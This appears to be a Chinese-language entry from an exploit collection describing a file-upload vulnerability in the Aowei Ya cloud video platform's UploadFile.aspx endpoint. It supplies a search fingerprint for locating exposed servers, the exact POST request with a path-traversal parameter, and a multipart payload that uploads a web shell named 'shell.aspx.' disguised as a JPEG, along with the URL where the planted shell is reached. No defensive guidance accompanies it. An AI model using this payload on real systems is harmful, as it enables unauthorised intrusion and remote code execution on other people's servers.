# 奥威亚云视频平台UploadFile.aspx存在文件上传漏洞

- **系统**：奥威亚云视频平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/Upload/DomainInfo/MaxAVALogo.png"`
- **请求**：`POST /Services/WeikeCutOut/UploadFile.aspx?VideoGuid=/../../ HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----sajhdjqwjejqwbejhqwbjebqwh…`

**请求体 / payload**
```
------sajhdjqwjejqwbejhqwbjebqwhje
Content-Disposition: form-data; name="file"; filename="shell.aspx."
Content-Type: image/jpeg
------sajhdjqwjejqwbejhqwbjebqwhje-
上传定位：[http://ip/shell.aspx](http://ip/shell.aspx)
```
- **预期**：200　|　—